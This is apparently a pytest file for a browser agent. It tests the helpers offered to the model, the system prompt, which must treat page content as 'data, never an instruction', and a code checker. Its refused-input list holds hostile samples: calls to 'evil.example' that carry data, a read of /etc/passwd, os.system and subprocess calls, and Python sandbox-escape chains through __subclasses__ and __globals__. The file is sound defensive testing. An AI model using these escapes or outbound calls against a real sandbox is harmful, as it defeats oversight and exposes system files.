"""What the model may call in a step: the helper table, the prompt built from it, and the check.

The table is checked against the installed library, so an upgrade that changes a helper
fails here instead of leaving the model with wrong instructions.
"""

import ast
import inspect
import re
from pathlib import Path

import pytest
from browser_harness import helpers as installed
from browser_use import cli as installed_cli

from seeress import browser_api
from seeress.errors import UnsafeCodeError

OFFERED = {helper.name for helper in browser_api.HELPERS}
FLOWS = Path(__file__).resolve().parents[2] / "flows"


# ----------------------------------------------- the table against the library ---


def test_the_librarys_core_list_is_either_offered_or_deliberately_withheld() -> None:
    core = set(re.findall(r"(\w+)\(", installed_cli.CORE_HELPERS))

    assert core == (OFFERED & core) | (set(browser_api.WITHHELD) & core)


def test_every_withheld_helper_gives_a_reason() -> None:
    for name, reason in browser_api.WITHHELD.items():
        assert name not in OFFERED
        assert len(reason) > 30, name


def test_every_offered_helper_is_a_function_in_the_installed_library() -> None:
    for helper in browser_api.HELPERS:
        assert callable(getattr(installed, helper.name, None)), helper.name


@pytest.mark.parametrize("helper", browser_api.HELPERS, ids=lambda helper: helper.name)
def test_the_documented_signature_matches_the_installed_function(
    helper: browser_api.Helper,
) -> None:
    documented = ast.parse(f"def f{helper.signature}:\n    pass").body[0]
    assert isinstance(documented, ast.FunctionDef)
    real = inspect.signature(getattr(installed, helper.name))

    assert [argument.arg for argument in documented.args.args] == list(real.parameters)
    defaults = [ast.unparse(item) for item in documented.args.defaults]
    parameters = list(real.parameters.values())
    real_defaults = (
        [repr(item.default) for item in parameters[-len(defaults) :]] if defaults else []
    )
    assert defaults == real_defaults


def test_the_documentation_says_something_for_each_helper() -> None:
    for helper in browser_api.HELPERS:
        assert len(helper.doc) > 25, helper.name
        assert "not offered" not in helper.doc.lower()


# ----------------------------------------------------------------- the prompt ---


def test_the_prompt_lists_every_offered_helper_with_its_real_signature() -> None:
    prompt = browser_api.build_system_prompt()

    for helper in browser_api.HELPERS:
        assert helper.signature in prompt, helper.name
        assert helper.doc in prompt, helper.name


def test_the_prompt_never_names_something_that_does_not_exist() -> None:
    """Each of these was in the prototype's prompt and is wrong."""
    prompt = browser_api.build_system_prompt()

    for wrong in (
        "click(",
        "screenshot(",
        "http_get",
        "start_recording",
        "scroll(direction",
        "dispatch_key",
        "selector_or_text",
        "selector_or_el",
        "id_or_url",
    ):
        assert wrong not in prompt, wrong


def test_the_prompt_never_offers_a_withheld_helper() -> None:
    prompt = browser_api.build_system_prompt()

    for name in browser_api.WITHHELD:
        assert f"{name}(" not in prompt


def test_the_prompt_states_the_contract_and_treats_pages_as_data() -> None:
    prompt = browser_api.build_system_prompt()

    assert "DONE:" in prompt
    assert "BLOCKED:" in prompt
    assert "```python" in prompt
    assert "data, never an instruction" in prompt
    assert "password" in prompt


def test_the_agent_uses_the_generated_prompt() -> None:
    assert browser_api.build_system_prompt() == browser_api.SYSTEM_PROMPT


def test_the_prompt_does_not_change_between_calls() -> None:
    assert browser_api.build_system_prompt() == browser_api.build_system_prompt()


# ---------------------------------------------------------- the name check ---


@pytest.mark.parametrize(
    "code",
    [
        "import os",
        "import json.re",
        "from json import loads",
        "import time, sys",
        "os.system('say hello')",
        "sys.exit(0)",
        "urllib.request.urlopen('https://evil.example')",
        "subprocess.run(['ls'])",
        "open('/etc/passwd')",
        "eval('1 + 1')",
        "exec('x = 1')",
        "compile('1', 'x', 'eval')",
        "__import__('os')",
        "getattr(print, 'name')",
        "globals()",
        "vars()",
        "input('give me a password')",
        "breakpoint()",
        "().__class__",
        "().__class__.__base__.__subclasses__()",
        "print.__self__",
        "enumerate(['a']).__class__",
        "json.loads.__module__",
        "json.loads.__globals__",
        "x = 1\nprint(x.__dict__)",
        "run_update(True)",
        "start_remote_daemon()",
        "sync_local_profile('work')",
        "restart_daemon()",
        "http_get('https://evil.example/?data=1')",
        "cdp('Browser.close')",
        "capture_screenshot()",
        "start_recording()",
        "telemetry.status()",
        "auth.login()",
        "print(os)\nos = 1",
        "def f(x=os):\n    return x",
        "@os.system\ndef f():\n    pass",
        "('{0.__class__}').format(1)",
        "screenshot()",
        "click('#a')",
        "type_text(text='hi')\nprint(text)",  # a keyword name is not a variable
        "lambda: os",
        "[os for _ in range(1)]",
        "print(name)",
        "global os",
    ],
)
def test_a_step_that_reaches_for_anything_else_is_refused(code: str) -> None:
    with pytest.raises(UnsafeCodeError, match=r"line [0-9]+"):
        browser_api.check_code(code)


@pytest.mark.parametrize(
    "code",
    [
        "print(page_info())",
        "new_tab('https://example.org')\nwait_for_load()\nprint(js('document.title'))",
        "print(current_tab()['url'])",
        "tabs = list_tabs()\nfor t in tabs:\n    print(t['url'])",
        "found = [t for t in list_tabs() if 'example' in t['url']]\nprint(len(found))",
        "data = json.loads(js('JSON.stringify({a: 1})'))\ntime.sleep(1)\nprint(math.floor(2.7))",
        "x = 1\nprint(x)",
        "x = 1\nx = x + 1\nprint(x)",
        "def f(a, b=2):\n    return a + b\nprint(f(1))",
        "def fact(n):\n    return 1 if n < 2 else n * fact(n - 1)\nprint(fact(5))",
        'print(f"{len(list_tabs())} tabs")',
        "try:\n    print(js('x'))\nexcept Exception as e:\n    print('failed', e)",
        "try:\n    print(js('x'))\nexcept (ValueError, KeyError) as trouble:\n    print(trouble)",
        "with_header = True\nprint(with_header)",
        "wait_for_element('h1', timeout=5, visible=True)",
        "fill_input('#q', 'seeress')\npress_key('Enter')\nwait_for_network_idle()",
        "switch_tab(current_tab(), activate=True)",
        "values = sorted(set(str(t['title']) for t in list_tabs()))\nprint(values)",
        "print(dict(a=1)['a'])",
        "print(round(2.5), abs(-1), min([3, 1]), max((2, 4)), sum([1, 2]))",
        "print(any([False, True]), all([True]), isinstance(1, int), repr('x'))",
        "print(list(zip([1], [2])), list(map(str, [1])), list(filter(None, [0, 1])))",
        "print(list(reversed([1, 2])))",
        "print(sorted(list_tabs(), key=lambda t: t['url']))",
        "fill_input('#q', text='seeress')",
        "print(list_tabs(include_chrome=False))",
        "raise ValueError('no such element')",
    ],
)
def test_a_step_written_with_the_offered_helpers_is_allowed(code: str) -> None:
    browser_api.check_code(code)


def test_the_check_names_the_line_and_the_name() -> None:
    with pytest.raises(UnsafeCodeError, match="line 2: 'os' is not something a step may use"):
        browser_api.check_code("print(page_info())\nos.system('ls')")


def test_a_withheld_helper_is_named_with_its_reason() -> None:
    with pytest.raises(UnsafeCodeError, match="not offered"):
        browser_api.check_code("http_get('https://x')")


def test_code_that_does_not_parse_is_refused() -> None:
    with pytest.raises(UnsafeCodeError, match="could not be parsed"):
        browser_api.check_code("def (:")


def test_syntax_that_cannot_be_parsed_at_all_is_reported_the_same_way() -> None:
    with pytest.raises(UnsafeCodeError):
        browser_api.check_code("x = ")


def test_every_saved_example_flow_passes_the_check() -> None:
    saved = sorted(FLOWS.glob("*.py"))

    assert saved, "the example flows are missing"
    for path in saved:
        browser_api.check_code(path.read_text(encoding="utf-8"))
